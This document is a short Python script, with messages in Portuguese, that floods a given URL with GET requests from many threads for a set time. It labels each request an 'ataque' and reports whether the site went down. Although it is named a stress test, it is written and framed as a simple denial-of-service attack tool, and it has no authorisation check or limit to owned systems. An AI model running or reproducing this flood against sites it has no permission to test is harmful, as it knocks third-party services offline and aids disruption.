import sys
import time
import threading
import requests
from requests.exceptions import RequestException

if len(sys.argv) != 4:
    print("Uso: python3 stress.py URL TEMPO THREADS")
    sys.exit(1)

url = sys.argv[1]
tempo = int(sys.argv[2])
threads_qtd = int(sys.argv[3])

site_caiu = False

def ataque():
    global site_caiu
    fim = time.time() + tempo
    while time.time() < fim:
        try:
            resposta = requests.get(url, timeout=5)
            status = resposta.status_code
            print(f"[+] Ataque enviado! Status: {status}")
            if status >= 500:
                print(f"[!!] O site pode ter caído (Status {status})")
                site_caiu = True
        except RequestException:
            print("[!!] Erro ao conectar. O site pode ter caído.")
            site_caiu = True

print(f"🚀 Iniciando ataque em {url} por {tempo} segundos com {threads_qtd} threads...")

thread_list = []

for _ in range(threads_qtd):
    t = threading.Thread(target=ataque)
    t.start()
    thread_list.append(t)

for t in thread_list:
    t.join()

if site_caiu:
    print("❌ O site apresentou falhas durante o ataque (pode ter caído).")
else:
    print("✅ Ataque finalizado. O site respondeu durante todo o ataque.")
